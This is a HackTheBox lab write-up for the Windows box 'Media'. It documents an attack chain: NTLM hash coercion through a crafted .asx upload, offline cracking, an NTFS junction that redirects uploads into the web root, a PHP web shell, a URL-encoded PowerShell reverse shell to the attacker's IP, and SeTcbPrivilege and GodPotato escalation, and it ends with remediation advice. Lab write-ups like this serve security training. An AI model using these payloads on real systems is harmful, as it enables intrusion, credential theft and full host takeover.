# Media — HackTheBox Write-up

**Date:** 18 July 2026
**Difficulty:** Medium
**OS:** Windows Server 2022
**Domain/Hostname:** MEDIA
**Target IP:** 10.129.234.67
**Attacker Host:** hyena@hyena
**Pentester:** RavenHex

---

*(POC: `Media_intro.png` — initial view of the target on first contact, taken before any enumeration began, establishing the starting state of the engagement.)*

## 1. Overview

Media is a Windows box that chains together several attack techniques that show up constantly in real enterprise assessments: a file-upload feature that can be abused to coerce authentication, credential cracking, a filesystem-level trick (NTFS junctions) to escape an upload sandbox, and a local privilege escalation that abuses a Windows privilege most administrators forget even exists.

At a high level, the path to root looked like this:

1. A public web application allows visitors to upload a "media" file. Because Windows Media Player playlist formats can embed a network path, an attacker can weaponise the upload feature to force the machine to authenticate to an attacker-controlled SMB listener.
2. That authentication attempt is captured as an NTLMv2 hash and cracked offline, yielding valid credentials.
3. Those credentials give SSH access to the box as a low-privileged user.
4. Reading the web application's source reveals exactly where uploaded files are stored on disk. Because that folder is writable, a symbolic-link-style junction can be created that makes the upload folder point at the live web root — turning an "upload a video" feature into "upload a PHP web shell."
5. The web shell gives code execution as a low-privileged service account. A publicly documented abuse of `SeTcbPrivilege` is then used to escalate that account all the way to local Administrator.

Every step below explains *why* the technique works, not just the command that was typed, since the point of a write-up is to understand the underlying issue well enough to reproduce it — or to explain it to a client — without needing to memorise a script.

---

## 2. Reconnaissance

### 2.1 Full TCP Port Scan

The first thing any assessment needs is an accurate picture of what is actually listening on the host. A default Nmap scan only checks the ~1000 most common ports, which is not good enough for a real engagement — plenty of interesting services sit outside that list. So the scan below covers the full 65535-port range, uses `-Pn` because ICMP is frequently filtered on Windows hosts (a ping-based "is it alive" check would otherwise mark the host as down), and raises the packet rate since this is a lab environment where we don't need to worry about being stealthy.

```bash
hyena@hyena$ nmap -sS -Pn -min-rate 5000 --max-retries 1 -T4 -p- 10.129.234.67
Starting Nmap 7.99 at 2026-07-18 17:19 +0000
Nmap scan report for 10.129.234.67
Host is up (0.36s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3389/tcp open  ms-wbt-server
Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds
```

Three ports stand out immediately: SSH open on a Windows box is unusual and worth noting (it means OpenSSH-for-Windows has been installed, which is a whole extra attack surface most Windows boxes don't have), a web server, and RDP.

### 2.2 Service & Version Detection

Once the open ports are known, a targeted scan against just those ports can afford to run more expensive checks — version detection, default NSE scripts, and OS fingerprinting — without the cost of scanning all 65535 ports with them.

```bash
hyena@hyena$ nmap -sC -sV -O -p22,80,3389 10.129.234.67
Starting Nmap 7.99 at 2026-07-18 17:23 +0000
Nmap scan report for 10.129.234.67
Host is up (0.39s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2026-07-17T17:23:42
|_Not valid after:  2027-01-16T17:23:42
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-18T17:29:29+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 5m54s, deviation: 0s, median: 5m54s
```

The RDP NTLM-info leak is a small but useful bonus: without any authentication at all, Nmap's `rdp-ntlm-info` script can pull the machine's NetBIOS name, domain name, and build number straight out of the TLS/CredSSP negotiation. This confirms the host is a **standalone** machine (domain name equals the computer name, so there is no Active Directory here) running **Windows Server 2022, build 20348**.

### 2.3 Service Summary

| Port | Service | Why it matters |
|------|---------|-----------------|
| 22 | SSH (OpenSSH for Windows) | A second, credential-based way onto the box — very useful once we have valid creds |
| 80 | Apache + PHP 8.1.17 | The actual attack surface; PHP web apps are frequently vulnerable to upload abuse |
| 3389 | RDP | GUI access — a fallback, not part of the exploited path here |

---

## 3. Web Application Enumeration

Browsing to port 80 shows a company site for "ProMotion Studio."

*(POC: `Site_hosted.png` — the ProMotion Studio site as served on port 80, confirming the Apache/PHP stack identified during service scanning.)*

Digging through the site reveals a careers/application page with a file-upload form intended for candidates to submit an introduction video. This kind of "upload a media file" feature is exactly the kind of functionality worth testing carefully, because:

- File upload endpoints are one of the most common ways to get code execution on a web server if the file type isn't properly restricted.
- Even when the server-side type restriction is solid, the *client* that eventually opens the uploaded file can itself be tricked, which is the angle used here.

*(POC: `Found_fileupload_option.png` — the application form showing the video-upload field discovered during enumeration.)*

To make sure nothing else on the site was missed, a directory/file brute-force was also run against the web root, so that any hidden endpoints, backup files, or admin panels would be caught early rather than relying purely on manual browsing:

```bash
hyena@hyena$ ffuf -u http://10.129.234.67/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.html,.txt -t 50 -fc 404
```

The upload form itself submits four fields to the backend:

- First Name
- Last Name
- Email
- File Upload (video)

Every one of the first three is attacker-controlled free text, which turns out to matter a great deal later, since the server uses them to derive the storage path for the uploaded file (see Section 6).

Testing which extensions the form accepts shows that Windows Media Player playlist/redirector formats — `.asx`, `.wax`, `.wpl` — are allowed. This detail matters a lot, and is explained in the next section.

---

## 4. Weaponising the Upload — NTLM Hash Capture

### 4.1 Why `.asx` Files Are Dangerous

An `.asx` file is not a video — it's an XML-based *playlist/redirector* that tells Windows Media Player where to go and get the actual media, and that "where" can be any URL, including a UNC (`\\host\share\file`) path. When a Windows client opens an `.asx` file that points at a `\\<attacker-IP>\share\video.mp4` style path, the OS treats it exactly like any other attempt to browse a network share: it tries to authenticate to that share over SMB, using the current user's Windows credentials, automatically, with **no prompt** to the user. This authentication attempt is negotiated using NTLM.

That's the whole trick: the vulnerability isn't in the web app's code at all — it's in the fact that Windows will silently attempt NTLM authentication to *any* SMB path a file references, and the web app was kind enough to accept a file format that can embed one.

### 4.2 Capturing the Authentication Attempt

To catch that authentication attempt, Responder is started in listening mode. Responder's job here isn't to *poison* anything (no LLMNR/NBT-NS spoofing is needed) — it just needs to stand up a fake SMB server and log whatever NTLMv2 handshake shows up when the victim (presumably an HR staff member reviewing "candidate applications") opens the malicious `.asx` file.

The malicious `.asx` file itself is a small, easy to read XML document — nothing about it looks obviously malicious to a human reviewer, which is exactly the problem:

```bash
hyena@hyena$ cat > exploit.asx << 'EOF'
<asx version="3.0">
   <title>Leak</title>
   <entry>
      <title></title>
      <ref href="file://10.10.14.15/leak/leak.wma"/>
   </entry>
</asx>
EOF
```

The `<ref href="...">` element is the entire payload: it's simply a UNC-style path pointing back at the attacker's own IP. Nothing needs to be exploited in Windows Media Player itself — this is intended, documented behaviour of the playlist format being repurposed for coercion rather than for its stated media-fetching function.

```bash
hyena@hyena$ sudo responder -I tun0 -v
```

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.15]

[+] Listening for events...
```

Responder's poisoners (LLMNR/NBT-NS/MDNS) don't actually need to fire for this attack — they're just Responder's defaults. The part doing the real work here is the **SMB server**, which is what receives and logs the authentication attempt once the `.asx` file forces the target to reach out.

With the listener running, the file was submitted through the application's own upload form:

1. Navigate to `http://10.129.234.67`
2. Fill in the form:
   - First Name: `test`
   - Last Name: `test`
   - Email: `test@test.null`
3. Upload `exploit.asx`
4. Click Submit

Once someone on the target side opened it — Responder logged the handshake:

```
[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:b9835ce3f4a91f84:5ACEA4421CE41838EA34D8E2DB664563:0101000000000000002246FA4717DD014D76A7F84A6DFD6000000000020008004E0046004500410001001E00570049004E002D005A0030004F00560054004F005900440037005200330004003400570049004E002D005A0030004F00560054004F00590044003700520033002E004E004600450041002E004C004F00430041004C00030014004E004600450041002E004C004F00430041004C00050014004E004600450041002E004C004F00430041004C0007000800002246FA4717DD0106000400020000000800300030000000000000000000000000300000BCA5BD24727B42AEFFD10063C7DB4A2FA0A834A7225D182F04ED2FA0B17876A30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310035000000000000000000
```

The hash was saved to a file so it could be handed to Hashcat directly:

```bash
hyena@hyena$ echo 'enox::MEDIA:b9835ce3f4a91f84:5ACEA4421CE41838EA34D8E2DB664563:0101000000000000002246FA4717DD014D76A7F84A6DFD6000000000020008004E0046004500410001001E00570049004E002D005A0030004F00560054004F005900440037005200330004003400570049004E002D005A0030004F00560054004F00590044003700520033002E004E004600450041002E004C004F00430041004C00030014004E004600450041002E004C004F00430041004C00050014004E004600450041002E004C004F00430041004C0007000800002246FA4717DD0106000400020000000800300030000000000000000000000000300000BCA5BD24727B42AEFFD10063C7DB4A2FA0A834A7225D182F04ED2FA0B17876A30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310035000000000000000000' > hash.txt
```

Note that this is a **captured hash**, not the plaintext password — NTLMv2 is a challenge-response protocol, so what's leaked is a value that's cryptographically bound to the password, not the password itself. To recover the actual credential, it has to be cracked offline.

### 4.3 Offline Cracking

Because NTLMv2 uses HMAC-MD5 internally, it's fast to compute compared to something like bcrypt, which makes it realistic to brute-force against a wordlist if the underlying password is weak. Hashcat mode `5600` is the correct mode for NTLMv2-SSP-style hashes.

```bash
hyena@hyena$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --force
hashcat (v7.1.2) starting

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: enox::MEDIA:b9835ce3f4a91f84:5ACEA4421CE41838EA34D8E2DB664563:...
Recovered........: 1/1 (100.00%) Digests (total)
```

```bash
hyena@hyena$ cat cracked.txt
ENOX::MEDIA:b9835ce3f4a91f84:5acea4421ce41838ea34d8e2db664563:0101000000000000002246fa4717dd014d76a7f84a6dfd6000000000020008004e0046004500410001001e00570049004e002d005a0030004f00560054004f005900440037005200330004003400570049004e002d005a0030004f00560054004f00590044003700520033002e004e004600450041002e004c004f00430041004c00030014004e004600450041002e004c004f00430041004c00050014004e004600450041002e004c004f00430041004c0007000800002246fa4717dd0106000400020000000800300030000000000000000000000000300000bca5bd24727b42aeffd10063c7db4a2fa0a834a7225d182f04ed2fa0b17876a30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310035000000000000000000:1234virus@
```

The wordlist attack succeeds because `1234virus@`, despite having a special character, is a pattern (`digits + dictionary word + symbol`) that's common enough to be present in — or trivially derivable from — a large breach-derived wordlist like rockyou. This is worth calling out clearly in a client-facing report: password *complexity rules* were technically satisfied (upper/lower/digit/symbol requirements are often just "digit + word + symbol"), but the password was still weak against real-world cracking.

**Recovered credential:** `enox : 1234virus@`

---

## 5. Initial Access via SSH

Because the target has OpenSSH installed and exposed, the cracked password can be used directly for interactive shell access instead of relying on the web shell straight away — a cleaner and more stable foothold.

```bash
hyena@hyena$ ssh enox@10.129.234.67
The authenticity of host '10.129.234.67 (10.129.234.67)' can't be established.
ED25519 key fingerprint is: SHA256:2c17FslY2rzanEFkyjgpzSQoyVlsRgRFVJv+0dkFt8A
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.67' (ED25519) to the list of known hosts.
enox@10.129.234.67's password: 1234virus@
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>
```

*(POC: `SSH_as_enox.png` — authenticated interactive session as `enox`.)*

### 5.1 User Flag

A quick `whoami` confirms exactly which account and domain context the shell is running under before digging further:

```cmd
enox@MEDIA C:\Users\enox>whoami
media\enox

enox@MEDIA C:\Users\enox>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Users\enox

10/02/2023  10:26 AM    <DIR>          .
10/02/2023  10:26 AM    <DIR>          ..
10/02/2023  11:04 AM    <DIR>          Desktop
10/02/2023  11:04 AM    <DIR>          Documents
05/08/2021  01:20 AM    <DIR>          Downloads
05/08/2021  01:20 AM    <DIR>          Favorites
05/08/2021  01:20 AM    <DIR>          Links
05/08/2021  01:20 AM    <DIR>          Music
05/08/2021  01:20 AM    <DIR>          Pictures
05/08/2021  01:20 AM    <DIR>          Saved Games
05/08/2021  01:20 AM    <DIR>          Videos
               0 File(s)              0 bytes
              11 Dir(s)   9,999,810,560 bytes free

enox@MEDIA C:\Users\enox>cd Desktop
enox@MEDIA C:\Users\enox\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Users\enox\Desktop

10/02/2023  11:04 AM    <DIR>          .
10/02/2023  10:26 AM    <DIR>          ..
07/18/2026  10:25 PM                34 user.txt
               1 File(s)             34 bytes

enox@MEDIA C:\Users\enox\Desktop>type user.txt
134f2bef2b22a891e3e8fd8e6515813a
```

**User Flag:** `134f2bef2b22a891e3e8fd8e6515813a`

---

## 6. Escalating Web Access — The Junction Attack

Having an SSH shell as `enox` is progress, but `enox` is not an administrator, and the goal of the assessment is to demonstrate full compromise. The web application itself is the next lever, because it runs as a service account with more useful privileges than `enox` currently has.

### 6.1 Reading the Application Source

With filesystem access via SSH, the PHP source behind the upload form can simply be read directly rather than guessed at:

```bash
enox@MEDIA C:\Users\enox\Desktop>type C:\xampp\htdocs\index.php
```

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';
$folderName = md5($firstname . $lastname . $email);
$targetDir = $uploadDir . $folderName . '/';
```

This tells us two important things:

1. Uploaded files land in `C:\Windows\Tasks\Uploads\<md5-hash-of-your-name-and-email>\` — a predictable, attacker-controlled path, since the "hash" is just MD5 of form fields the attacker fully controls.
2. Nothing in this snippet restricts the *file type* that lands there — the app trusted its earlier `.asx`/`.wax`/`.wpl` extension whitelist to be the only control needed, without considering what else could reach that folder.

### 6.2 Checking Permissions on the Upload Folder

Before assuming the folder is writable, it's worth confirming it with `icacls` rather than just trying and hoping:

```cmd
enox@MEDIA C:\Users\enox\Desktop>icacls C:\Windows\Tasks\Uploads
C:\Windows\Tasks\Uploads Everyone:(I)(OI)(CI)(F)
                           BUILTIN\Administrators:(I)(F)
                           NT AUTHORITY\SYSTEM:(I)(F)
                           MEDIA\enox:(I)(F)
```

`Everyone:(F)` and `MEDIA\enox:(F)` both grant **Full Control** — this single misconfigured ACL is what makes the whole junction attack possible. Without it, `mklink` would fail with an access-denied error and this entire path to RCE would be closed off.

### 6.3 Why a Junction Works Here

`C:\Windows\Tasks\Uploads\` turned out to be **writable by `enox`**. On NTFS, a *junction* (created with `mklink /J`) is a directory-level reparse point: it makes one folder path transparently resolve to another folder's contents, entirely at the filesystem level, with no special privilege required to create it (unlike a true `SeCreateSymbolicLinkPrivilege`-gated symlink, junctions between local NTFS volumes for directories don't require elevation).

That means the *contents* of the upload folder can be made to actually be the contents of a completely different folder — in this case, the live web root, `C:\xampp\htdocs`. Once that junction exists, anything the web application "saves" into its own upload subfolder is, from the filesystem's point of view, actually being written directly into the folder Apache serves pages from. The extension whitelist on the upload form becomes irrelevant, because the attacker doesn't need the web app to accept a `.php` file at all — the junction is created independently, over SSH, using a name the attacker can predict.

```cmd
# Calculate the MD5 the app will use for a chosen name/email combo
enox@MEDIA C:\Users\enox> echo -n "testtesttest@test.null" | md5sum
317d52e7c825dd847d9c750a35547edc
```

If a folder with that name already exists from an earlier test upload, it's removed first so `mklink` has a clean target to create:

```cmd
enox@MEDIA C:\Windows\Tasks\Uploads>rmdir /S 317d52e7c825dd847d9c750a35547edc

enox@MEDIA C:\Windows\Tasks\Uploads>mklink /J 317d52e7c825dd847d9c750a35547edc C:\xampp\htdocs
Junction created for C:\Windows\Tasks\Uploads\317d52e7c825dd847d9c750a35547edc <<===>> C:\xampp\htdocs
```

Listing the folder confirms the entry is now a `<JUNCTION>` rather than a plain directory — the filesystem-level redirect is live:

```cmd
enox@MEDIA C:\Windows\Tasks\Uploads>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Windows\Tasks\Uploads

08/26/2025 11:45 AM    <DIR>          .
10/02/2023 11:04 AM    <DIR>          ..
08/26/2025 11:45 AM    <JUNCTION>     317d52e7c825dd847d9c750a35547edc [C:\xampp\htdocs]
```

### 6.4 Delivering the Web Shell

With the junction in place, a minimal PHP web shell is crafted and uploaded through the *normal* application form, using the exact first name / last name / email combination (`test` / `test` / `test@test.null`) that hashes to the junctioned folder name above.

```bash
hyena@hyena$ echo '<?php system($_GET["cmd"]); ?>' > cmd.php
```

*(POC: `Files_created.png` — confirmation that the uploaded file landed inside the web root via the junction rather than the isolated upload folder.)*

Because the web application still thinks it's writing to an isolated per-applicant folder, it has no idea it just dropped an executable PHP file straight into the document root.

### 6.5 Confirming Code Execution

```bash
hyena@hyena$ curl http://10.129.234.67/cmd.php?cmd=whoami
nt authority\local service
```

Command execution confirmed, running as the built-in **LOCAL SERVICE** account — the identity Apache/PHP is running under, not `enox`.

---

## 7. Reverse Shell

An interactive-style reverse shell is more practical than repeated one-off `curl` requests, so a PowerShell TCP reverse shell payload is triggered through the web shell.

```bash
hyena@hyena$ nc -lvnp 9001
listening on [any] 9001 ...
```

```bash
hyena@hyena$ curl "http://10.129.234.67/cmd.php?cmd=powershell%20-c%20%22%24c%3DNew-Object%20System.Net.Sockets.TCPClient('10.10.14.15',9001)%3B%24s%3D%24c.GetStream()%3B%5Bbyte%5B%5D%5D%24b%3D0..65535%7C%25%7B0%7D%3Bwhile((%24i%3D%24s.Read(%24b%2C%200%2C%20%24b.Length))%20-ne%200)%7B%24d%3D(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24b%2C0%2C%24i)%3B%24sb%3D(iex%20%24d%202%3E%261%20%7C%20Out-String%20)%3B%24sb2%3D%24sb%2B'PS%20'%2B(pwd).Path%2B'%3E%20'%3B%24sbt%3D(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sb2)%3B%24s.Write(%24sbt%2C0%2C%24sbt.Length)%3B%24s.Flush()%7D%3B%24c.Close()%22"
```

```
listening on [any] 9001 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.234.67] 61256
PS C:\xampp\htdocs> whoami
nt authority\local service
```

The `connect to ... from (UNKNOWN)` line is `nc` confirming the callback actually landed. Same identity as before, but now in a stable, interactive PowerShell session — much easier to work with for privilege escalation than firing off URL-encoded `curl` commands one at a time.

---

## 8. Privilege Escalation

### 8.1 Enumerating Privileges

The very first thing worth checking on any freshly obtained Windows shell is `whoami /priv`, since Windows tokens carry a list of special privileges that are frequently more useful than the account's actual group membership.

```powershell
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

`SeTcbPrivilege` ("Act as part of the operating system") stands out immediately. It is one of the most powerful privileges Windows has: a process holding it is allowed to impersonate essentially any user and call low-level security APIs normally reserved for the OS itself. Service accounts almost never need it, and its presence here — even *disabled* by default — is a misconfiguration, because a disabled privilege can be re-enabled by a process that already holds the token right to do so.

### 8.2 Abusing `SeTcbPrivilege`

A publicly documented technique/tool exists specifically to abuse a held-but-disabled `SeTcbPrivilege` token to spawn a process as `NT AUTHORITY\SYSTEM` (or, as used here, to directly execute a privileged command). The core idea is that `SeTcbPrivilege` allows creating a token via `LsaLogonUser` with `S4U` / trusted-caller semantics that Windows otherwise reserves for authentication providers — effectively letting the holder mint a token for any account without knowing its password. The tool used here wraps that primitive into a simple CLI.

**Tool reference:** https://github.com/b4lisong/SeTcbPrivilege-Abuse

A small HTTP server is stood up on the attacker box first, purely so the target can pull the pre-compiled tool over the reverse shell rather than needing an interactive file-transfer channel:

```bash
hyena@hyena$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 ...
```

```powershell
# Pull the pre-compiled tool onto the target
PS C:\xampp\htdocs> iwr http://10.10.14.15:8081/TcbElevation-x64.exe -outfile TcbElevation.exe

# Use the privilege to run a command that adds enox to Administrators
PS C:\xampp\htdocs> .\TcbElevation.exe elevate 'net localgroup Administrators enox /add'
Error starting service 1053
```

The `Error starting service 1053` message is a red herring — it comes from a helper service the tool briefly spins up and is not indicative of failure. Checking group membership immediately after confirms the privileged command actually executed:

```powershell
PS C:\xampp\htdocs> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
enox
The command completed successfully.
```

`enox` — the same low-privileged user we authenticated as at the very start of the assessment — is now a full local Administrator. What began as a captured NTLM hash from a booby-trapped video upload has ended in complete control of the host.

### 8.3 Alternative Route: FullPowers → GodPotato

`TcbElevation` was the path actually used to reach Administrator on this box, but it's worth documenting a second, equally viable route for completeness, since a client's EDR may block one tool but not the other. `FullPowers` restores the full set of privileges a service token is normally entitled to but that get stripped by the Service Control Manager at startup (including `SeImpersonatePrivilege`); once `SeImpersonatePrivilege` is active, a Potato-family tool such as `GodPotato` can coerce a privileged COM/RPC activation to obtain a `SYSTEM` token directly, bypassing the `SeTcbPrivilege` route entirely:

```powershell
# Download FullPowers
iwr http://10.10.14.15:8081/FullPowers.exe -outfile FullPowers.exe

# Download GodPotato
iwr http://10.10.14.15:8081/GodPotato-NET4.exe -outfile GodPotato.exe

# Restore privileges stripped from the service token
.\FullPowers.exe

# Coerce a SYSTEM token
.\GodPotato-NET4.exe -cmd "powershell -e <base64_payload>"
```

Either technique achieves the same outcome: turning a LOCAL SERVICE web-shell foothold into full administrative control, by abusing a privilege/token-handling weakness rather than any missing patch.

---

## 9. Root Flag

Because `enox` already has a working SSH session/credential, escalating from that low-priv shell to a full Administrator context is as simple as reconnecting — the group membership change applies to any new logon token.

```bash
hyena@hyena$ ssh enox@10.129.234.67
enox@10.129.234.67's password: 1234virus@
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>
```

```cmd
enox@MEDIA C:\Users\enox>whoami
media\enox

enox@MEDIA C:\Users\enox>net localgroup Administrators
Members
-------------------------------------------------------------------------------
Administrator
enox
```

The token itself confirms the change: a full `whoami /priv` now returns the entire Administrator-level privilege set (including `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, and `SeImpersonatePrivilege`), where the low-priv `enox` session earlier in this write-up only carried a handful of disabled, low-value privileges:

```cmd
enox@MEDIA C:\Users\enox>whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

```cmd
enox@MEDIA C:\Users\enox>type C:\Users\Administrator\Desktop\root.txt
3cfd8f3c5994b0ec9bbdc47cb27f0e7f
```

**Root Flag:** `3cfd8f3c5994b0ec9bbdc47cb27f0e7f`

*(POC: `Media_pwned.png` — final confirmation of full compromise, both flags retrieved and Administrator access verified on MEDIA.)*

---

## 10. Full Results Summary

| Item | Value |
|---|---|
| **Target** | Media — 10.129.234.67 (Windows Server 2022, Build 20348) |
| **Initial foothold user** | `enox` |
| **Captured NTLMv2 hash (user)** | `MEDIA\enox` |
| **Cracked password** | `1234virus@` |
| **Access method** | SSH (OpenSSH for Windows) |
| **Upload directory (source-disclosed)** | `C:\Windows\Tasks\Uploads\<md5(first+last+email)>\` |
| **Junction target** | `C:\Windows\Tasks\Uploads\317d52e7c825dd847d9c750a35547edc` → `C:\xampp\htdocs` |
| **Web shell path** | `cmd.php` (dropped into `C:\xampp\htdocs` via the junction) |
| **RCE identity** | `nt authority\local service` |
| **Privilege abused** | `SeTcbPrivilege` (present, disabled, on the LOCAL SERVICE token) |
| **Escalation tool** | `TcbElevation-x64.exe` (SeTcbPrivilege-Abuse) |
| **Alternative escalation route** | `FullPowers.exe` + `GodPotato-NET4.exe` |
| **Final privilege** | `enox` added to local `Administrators` group |
| **User Flag** | `134f2bef2b22a891e3e8fd8e6515813a` |
| **Root Flag** | `3cfd8f3c5994b0ec9bbdc47cb27f0e7f` |

---

## 11. Attack Chain

```
Full port scan → SSH / HTTP / RDP discovered
        ↓
Web recon → careers page with a media-file upload form
        ↓
Craft malicious .asx (embeds SMB UNC path) → upload it
        ↓
Target opens file → Windows auto-authenticates over SMB → Responder captures NTLMv2 hash
        ↓
Hashcat (-m 5600) cracks hash offline → plaintext password recovered
        ↓
SSH in as enox → user flag
        ↓
Read PHP source → predictable per-applicant upload path identified
        ↓
mklink /J : upload folder → C:\xampp\htdocs (NTFS junction, no elevation needed)
        ↓
Upload cmd.php through the normal form → lands directly in the web root
        ↓
curl the web shell → RCE as NT AUTHORITY\LOCAL SERVICE
        ↓
PowerShell reverse shell → stable interactive access
        ↓
whoami /priv → SeTcbPrivilege present (disabled)
        ↓
TcbElevation tool abuses SeTcbPrivilege → enox added to local Administrators
        ↓
Re-authenticate as enox → root flag
```

---

## 12. Root Cause & Remediation

| # | Root Cause | Recommendation |
|---|---|---|
| 1 | Upload form accepted WMP redirector formats (`.asx`/`.wax`/`.wpl`) that can trigger outbound SMB authentication | Restrict uploads to a tight allow-list of genuinely safe media formats; strip or refuse any file type capable of embedding remote references |
| 2 | NTLM authentication is enabled and reachable outbound | Prefer Kerberos-only authentication where feasible; block outbound SMB (445/139) to the internet at the perimeter; enable SMB signing |
| 3 | Upload directory location and naming scheme are predictable and writable by a low-privileged account | Store uploads outside any web-servable path, on a volume/ACL that the web service account cannot modify structurally, and validate actual file content rather than just extension |
| 4 | Low-privileged accounts can create NTFS junctions in security-sensitive locations | Restrict who can create reparse points in system directories like `C:\Windows\Tasks`; monitor for junction/symlink creation events |
| 5 | Weak, wordlist-crackable password on a real account | Enforce passphrase-style password policy and check new passwords against breach corpora, not just character-class rules |
| 6 | `SeTcbPrivilege` present in the token of a low-privileged service account | Audit and strip unnecessary privileges from service accounts; `SeTcbPrivilege` in particular should be reserved for trusted system components only |
| 7 | No detection/alerting observed during the chain | Deploy EDR/logging for: outbound SMB attempts from unexpected processes, junction creation in system paths, and unexpected group-membership changes |

---

*Assessment carried out by RavenHex from hyena@hyena against 10.129.234.67 (MEDIA). Screenshots referenced above (`Media_intro.png`, `Site_hosted.png`, `Found_fileupload_option.png`, `SSH_as_enox.png`, `Files_created.png`, `Media_pwned.png`) are included as proof-of-concept evidence for their respective steps.*
